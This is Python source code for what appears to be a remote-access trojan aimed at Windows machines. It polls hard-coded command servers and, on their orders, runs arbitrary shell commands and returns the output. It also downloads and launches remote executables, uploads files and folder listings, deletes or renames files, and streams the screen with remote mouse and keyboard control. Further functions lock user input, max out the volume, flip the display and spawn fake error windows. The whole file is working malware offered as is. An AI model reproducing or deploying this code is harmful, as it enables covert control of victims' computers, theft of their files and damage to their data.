from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from os import path, mkdir, startfile, remove, system, listdir, rename, remove
from mouse import move, click, wheel, double_click
from rotatescreen import get_primary_display
from PIL.Image import frombytes, Resampling
from webbrowser import open as wbopen
from subprocess import run as sbrun
from keyboard import wait, send
from requests import get,post
from time import sleep, time
from threading import Thread
from pyautogui import size, mouseDown, mouseUp
from shutil import rmtree
from io import BytesIO
from mss import mss
import tkinter as tk
import pyttsx3
import asyncio
import aiohttp
import psutil
import pygame
import ctypes
url = "https://ms32-sha2.onrender.com/" if b"This service has been suspended." not in get("https://ms32-sha2.onrender.com").content else "https://ms32-c67b.onrender.com/"
server_url = "https://server-20zy.onrender.com/" if b"This service has been suspended." not in get("https://server-20zy.onrender.com").content else "https://server-ktcy.onrender.com/"
# url = "http://192.168.9.115:5000/"
screen = get_primary_display()
terminate = False           
sstate = False
sharing = False
bstate = False
bmstate = False
bsig  = False
user = "03"
width, height = size()
try:
    pygame.mixer.init()
except:
    try:
        statement = f"WARN   no speaker detected, no audio will play"
        post(url+"output",data={"user":user,"err":statement})
    except:
        pass
              
if not path.exists("effects"):
    mkdir("effects")
if not path.exists("assets"):
    mkdir("assets")
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def hit(url:str,data=None):
    # try:
        if not terminate:
            if data:
                return post(url,json=data)
            return get(url,stream=True)
    # except:
    #     return "none"

def log(statement,state="SUCESS",terminal=False):
    try:
        statement = f"{state}   {statement}"
        hit(url+"terminal",data={"output":statement}) if terminal else None
        hit(url+"output",data={"user":user,"err":statement})
    except:
        pass

def say(txt):
    try:
        engine = pyttsx3.init()
        engine.setProperty("rate",engine.getProperty('rate')-40)
        engine.say(txt)
        log(f"Played {txt}",terminal=True)
        engine.runAndWait()
    except Exception as e:
        log(f"pyttsx3 thread error:\t{e}",state="WARN")

def playfunc(fp):
    try:
        if not path.exists(path.join("effects",fp)):
            audi = hit(url+f"static/sounds/{fp}")
            try:
                kp = type(audi.content.decode("utf-8"))
                log(f"Likely error. recieved content for {fp} is {kp}")
            except Exception as e:
                log(f"DOwnloaded {fp}")
            with open(path.join("effects",fp), "xb") as file:
                downloaded_size = 0
                for chunk in audi.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        # try:                
        CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        
        if volume.GetMute():
            volume.SetMute(0, None)
            log("Unmuted")
        vmin, vmax, _ = volume.GetVolumeRange()
        target = vmin + (95 / 100.0) * (vmax - vmin)
        target = max(min(target, vmax), vmin)
        volume.SetMasterVolumeLevel(target, None)
        # except:
        #     pass
        CoUninitialize()
        log("Vol set to 80")
        pygame.mixer.music.load(f"effects/{fp}")
        log(f"Playing {fp}",terminal=True)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            continue               
        log(f"Done Played {fp}")
    except Exception as e:
        log(f"Audio thread error: \t{e}",state="WARN")

def update():
    try:
        global terminate
        exe = hit(url+"static/updates/ms32-1.exe")
        try:
            kp = type(exe.content.decode("utf-8"))
            log(f"Likely error. recieved content for ms32-1.exe is {kp}")
        except Exception as e:
            log(f"DOwnloaded ms32-1.exe")
        total_size = int(exe.headers.get('content-length', 0))
        with open("ms32-1.exe", "xb") as file:
            downloaded_size = 0
            for chunk in exe.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        if not path.exists("updater.exe"):
            exe = hit(url+"static/updates/updater.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for updater.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded updater.exe")
            with open("updater.exe", "wb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        startfile("updater.exe")
        log("Updating ms32.exe")
        terminate=True
        return
    except Exception as e:
        log(f"Updating thread error: \t{e}",state="WARN")

def hide(state):
    try:
        if state:
            if not path.exists("hide.exe"):
                exe = hit(url+"static/updates/hide.exe")
                try:
                    kp = type(exe.content.decode("utf-8"))
                    log(f"Likely error. recieved content for hide.exe is {kp}")
                except Exception as e:
                    log(f"DOwnloaded hide.exe")
                with open("hide.exe", "xb") as file:
                    downloaded_size = 0
                    for chunk in exe.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                            downloaded_size += len(chunk)
            startfile("hide.exe")
            log("Taskbar hidden",terminal=True)
        else:
            if not path.exists("show.exe"):
                exe = hit(url+"static/updates/show.exe")
                try:
                    kp = type(exe.content.decode("utf-8"))
                    log(f"Likely error. recieved content for show.exe is {kp}")
                except Exception as e:
                    log(f"DOwnloaded show.exe")
                with open("show.exe", "xb") as file:
                    downloaded_size = 0
                    for chunk in exe.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                            downloaded_size += len(chunk)
            startfile("show.exe")
            log("Taskbar Unhidden",terminal=True)
    except Exception as e:
        log(f"hide/show thread error occured:\t{e}",state="WARN")

def restart():
    try:
        global terminate
        if not path.exists("restart.exe"):
            exe = hit(url+"static/updates/restart.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for restart.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded restart.exe")
            with open("restart.exe", "xb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk) 
        startfile("restart.exe")
        log("Restarting...",terminal=True)
        terminate = True
    
    except Exception as e:
        log(f"Restart occured:\t{e}",state="WARN")

def run(name):
    try:
        if path.exists(name):
            remove(name)
        exe = hit(url+f"static/apps/{name}")
        try:
            kp = type(exe.content.decode("utf-8"))
            log(f"Likely error. recieved content for {name} is {kp}")
        except Exception as e:
            log(f"DOwnloaded {name}")
        with open(name, "xb") as file:
            downloaded_size = 0
            for chunk in exe.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        log(f"Running {name}")
        startfile(name)
        log(f"Done Running {name}")
    except Exception as e:
        log(f"Run thread error occured:\t{e}",state="WARN")

def display(fp:str):
    try:
        asset = hit(url+f"static/images/{fp}")
        try:
            kp = type(asset.content.decode("utf-8"))
            log(f"Likely error. recieved content for {fp} is {kp}")
        except Exception as e:
            log(f"DOwnloaded {fp}")
        ext = fp.split(".")[1]
        if path.exists("assets"):
            rmtree("assets")
            log("removed assets folder")
        mkdir("assets")
        with open(f"assets/sample.{ext}", "xb") as file:
            downloaded_size = 0
            for chunk in asset.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
        if not path.exists("imshow.exe"):
            exe = hit(url+f"static/apps/imshow.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for imshow.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded imshow.exe")
            with open("imshow.exe", "xb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        startfile("imshow.exe")
        log("Started imshow.exe, llikely image showing",terminal=True)
    except Exception as e:
        log(f"Display thread error occured:\t{e}",state="WARN")

def flip():
    global sstate
    try:
        log("Flipping",terminal=True)
        while sstate:
            screen.set_portrait()
            sleep(1)
            screen.set_landscape_flipped()
            sleep(1)
            screen.set_portrait_flipped()
            sleep(1)
            screen.set_landscape()
            sleep(1)
    except Exception as e:
        log(f"flip thread error occured:\t{e}",state="WARN")

def runcmd(cmd):
    try:
        command = cmd
        #kahe?
        try:
            result = sbrun(command, shell=True, capture_output=True, text=True)
            stdout = result.stdout
            stderr = result.stderr
            exit_code = result.returncode
        except Exception as e:
            stdout = ""
            stderr = str(e)
            exit_code = -1
        if not stderr:stderr="none"
        if not stdout:stdout="none"
        output = f"OUTPUT:\t{stdout}\nERROR:\t{stderr}\nCODE:\t{exit_code}"
        alsr = post(url+"terminal",json={"output":output})
        if alsr.status_code == 200:
            print("alsr")
            print(result.stdout)

    except Exception as e:
        log(f"runcmd thread error:\t{e}",state="WARN")

def showerr(num):
    try:
        if not path.exists("error.exe"):
            exe = hit(url+f"static/apps/error.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for error.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded error.exe")
            with open("error.exe", "xb") as file:
                    downloaded_size = 0
                    for chunk in exe.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                            downloaded_size += len(chunk)
        for _ in range(1,int(num)+1):
            Thread(target=startfile,args=("error.exe",)).start()
            sleep(0.5)
        log(f"deployed {num} errors",terminal=True)
    except Exception as e:
        log(f"showerr thread error:\t{e}",state="WARN")

def block_touch(event):
    global bstate
    if not bstate:
        return None
    return "break"
def block():
    root = tk.Tk()

    root.attributes("-fullscreen", True)
    root.attributes("-alpha", 0.01)
    root.attributes("-topmost", True)

    root.bind("<ButtonPress>", block_touch)
    root.bind("<ButtonRelease>", block_touch)
    root.bind("<Motion>", block_touch)
    while bstate:
        root.update()
    root.quit() 
    root.destroy()
    root = None  
def block_main():
    global bstate
    global bmstate
    global bsig
    bmstate = True
    bstate = True
    bsig = True
    while bmstate:
        Thread(target=block).start()
        while bsig:
            pass
        print("unlocking")
        bstate = False
        sleep(0.5)
        bstate = True
        bsig = True
        print("lock")        

async def share(url):
    global sharing
    log("Sharing screen now",terminal=True)
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(keepalive_timeout=10)) as session:
        with mss() as sct:
            frame_count = 0
            total_time = 0
            fps_start_time = time()
            monitor = sct.monitors[1]
            full_screen_width = monitor['width']
            full_screen_height = monitor['height']
            tasks = list()
            while sharing:
                try:
                    start_time = time()
                    screenshot = sct.grab(monitor)
                    img = frombytes("RGB", screenshot.size, screenshot.rgb)

                    target_width = 1280
                    target_height = int(target_width * full_screen_height / full_screen_width)
                    img = img.resize((target_width, target_height), Resampling.LANCZOS)

                    buffer = BytesIO()
                    img.save(buffer, format="JPEG", quality=30)
                    buffer.seek(0)
                    success = await send_screenshot(session, url, buffer)
                    if success:
                       frame_count += 1
                    frame_count += 1
                    frame_time = time() - start_time
                    total_time += frame_time
                    if time() - fps_start_time >= 1.0:
                        avg_fps = frame_count / (time() - fps_start_time)
                        # log(f"FPS: {avg_fps:.2f}")
                        print(f"FPS: {avg_fps:.2f}")
                        frame_count = 0
                        total_time = 0
                        fps_start_time = time()

                    target_fps = 30
                    sleep_time = max(0, 1 / target_fps - frame_time)
                    await asyncio.sleep(sleep_time)

                except Exception as e:log(f"share thread error:\t{e}",state="WARN")
            await asyncio.gather(*tasks)
async def send_screenshot(session, url, buffer):
    retries = 3
    for attempt in range(retries):
        try:
            async with session.post(url, data=buffer.getvalue(), timeout=5) as response:
                if response.status == 200:
                    return True
                else:
                    print(f"Attempt {attempt + 1}: Server responded with {response.status}")
        except Exception as e:
            log(f"Attempt {attempt + 1}: Error: {e}",state="WARN")
        await asyncio.sleep(2 ** attempt)
    return False
async def share_runner():
    log("sharing started")
    url = server_url+"screenshot"
    await share(url)
async def control_runner():
    await control()
def share_trig():
    asyncio.run(share_runner())
def control_trig():
    asyncio.run(control_runner())
async def control():
    global sharing
    global bsig
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(keepalive_timeout=10)) as session:
        while sharing:
            try:
                async with session.get(url+"control") as resp:
                    data = await resp.json()
                    if data and data["type"] == "mouse":
                        print(data)
                        x = data["x"]*(width/data["width"])
                        y = data["y"]*(height/data["height"])            
                        move(x,y)
                        if data["mouse"] == 0:
                            bsig = False;sleep(0.03)
                            click()
                        elif data["mouse"] == 1:   
                            bsig = False;sleep(0.03)     
                            click(button="middle")
                        elif data["mouse"] == 2:
                            bsig = False;sleep(0.03)
                            click(button="right")
                    elif data and data["type"] == "key" and data["btn"]:
                        btns = []
                        for key in data["btn"]:
                            btns.append(chr(key)) if type(key) == int else btns.append(key)
                        keys = "+".join(btns)
                        print(keys)
                        bsig = False;sleep(0.03)
                        send(keys.lower())
                    elif data and data["type"] == "scroll":
                        bsig = False;sleep(0.03)                                    
                        wheel(delta=-(data["deltaY"]))

                    elif data and data["type"] == "dbclick":
                        x = data["x"]*(width/data["width"])
                        y = data["y"]*(height/data["height"])            
                        move(x,y)
                        bsig = False;sleep(0.03)
                        double_click()
                    elif data["type"] == " drag":
                        x1 = data["x1"]*(width/data["width"])
                        y1 = data["y1"]*(height/data["height"])
                        x2 = data["x2"]*(width/data["width"])
                        y2 = data["y2"]*(height/data["height"])
                        bsig = False;sleep(0.03)
                        move(x1,y1)
                        sleep(0.01)
                        mouseDown()
                        sleep(0.01)
                        move(x2,y2)
                        sleep(0.01)
                        mouseUp()                   	                  	                       
                    await asyncio.sleep(0.09)
            except Exception as e:log(f"control thread error:\t{e}")
def commtxt():
    try:
        if not path.exists("speakdisplay.exe"):
            exe = hit(url+f"static/apps/speakdisplay.exe")
            try:
                kp = type(exe.content.decode("utf-8"))
                log(f"Likely error. recieved content for speakdisplay.exe is {kp}")
            except Exception as e:
                log(f"DOwnloaded speakdisplay.exe")
            with open("speakdisplay.exe", "xb") as file:
                    downloaded_size = 0
                    for chunk in exe.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                            downloaded_size += len(chunk)
            
        Thread(target=startfile,args=("speakdisplay.exe",)).start()
        log(f"started commtxt",terminal=True)
    except Exception as e:
        log(f"commtxt thread error:\t{e}",state="WARN")
def main():
    global sstate
    global sharing
    global bmstate
    global bsig
    log(f"{user} online!", state="ONLINE")
    while not terminate:
        try:
            sleep(0.5)
            cmd = hit(url+"command",data={"user":user})
            if type(cmd) != str:
                cmd = cmd.content.decode("utf-8")
            print(cmd)
            if "hIdE on" in cmd:
                Thread(target=hide,args=(True,)).start()
            elif "hIdE off" in cmd:
                Thread(target=hide,args=(False,)).start()
            elif "rEsTaRt" in cmd:
                restart()
            elif "oPeN" in cmd:
                link = cmd.replace("oPeN ","")
                link = link.replace("sPeAk","") if "sPeAk" in link else link
                wbopen(link)
                log(f"Opened {link}",terminal=True)
            elif "pLaY" in cmd:
                fp = cmd.replace("pLaY ","")
                fp = fp.replace("sPeAk","") if "sPeAk" in fp else fp
                Thread(target=playfunc,args=(fp,)).start()
            elif "uPdAtE" in cmd:
                update()
            elif "rUn" in cmd:
                app_name = cmd.replace("rUn ","")
                app_name = app_name.replace("sPeAk","") if "sPeAk" in app_name else app_name
                Thread(target=run,args=(app_name,)).start()
            elif "iMaGe" in cmd:
                ifp = cmd.replace("iMaGe ","")
                ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
                Thread(target=display,args=(ifp,)).start()
            elif "vIdEo" in cmd:
                ifp = cmd.replace("vIdEo ","")
                ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
                Thread(target=display,args=(ifp,)).start()
            elif "fLiP on" in cmd:
                sstate = True
                Thread(target=flip).start()
            elif "fLiP off" in cmd:
                sstate = False
                screen.set_landscape()
                log("flip off",terminal=True)
            elif "cMd" in cmd:
                cmd = cmd.replace("cMd ","")
                cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
                Thread(target=runcmd,args=(cmd,)).start()
            elif "eRr" in cmd:
                cmd = cmd.replace("eRr ","")
                cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
                Thread(target=showerr,args=(cmd,)).start()
            elif "sHaRe on" in cmd:
                sharing = True
                Thread(target=share_trig).start()
                Thread(target=control_trig).start()
            elif "sHaRe off" in cmd:
                sharing = False
            elif "bLoCk on" in cmd:
                Thread(target=block_main).start()
            elif "bLoCk off" in cmd:
                bmstate = False
            elif "cOm txt" in cmd:
                Thread(target=commtxt).start()
            elif "sPeAk" in cmd:
                txt = cmd.replace("sPeAk","")
                saying = Thread(target=say,args=(txt,))
                saying.start()
            elif "gEtFiLe" in cmd:
                p = cmd.replace("gEtFiLe ", "")
                if p.startswith("/"):
                    p = p.replace("/", "")
                
                try:
                    with open(p, "rb") as file:
                        files = {'file': file}
                        print("file")
                        try:
                            res = post(url + "post-file", files=files)
                        except Exception as e:
                            print("Error during file post:", e)
                except Exception as e:
                    print(f"Error opening file {p}: {e}")
            elif "rEnAmE" in cmd:
                a = cmd.replace("rEnAmE ","")
                p, name = a.split("|")
                rename(p,name)
            elif "dElEtE" in cmd:
                p = cmd.replace("dElEtE ","")
                remove(p)
            elif "gEtFoLdEr" in  cmd:
                p = cmd.replace("gEtFoLdEr ","")
                if p == "/":
                    folder = {}
                    partitions = psutil.disk_partitions()
                    for idx, partition in enumerate(partitions, start=1):
                        folder[f"folder{idx}"] = partition.device
                    post(url+"post-folder",json=folder)
                    print(folder)
                else:
                    if p.startswith("/"):
                        p = p.replace("/","")
                    datas = listdir(p)
                    folder = {}
                    for idx, data in enumerate(datas, start=1):
                        if path.isdir(path.join(p,data)):
                            folder[f"folder{idx}"] = data
                        else:
                            folder[f"file{idx}"] = data
                    print(folder)
                    post(url+"post-folder",json=folder)
        except Exception as e:
            log(f"Main thread error occured:\t{e}",state="WARN")
    log("Shutting down",state="OFFLINE")

main()
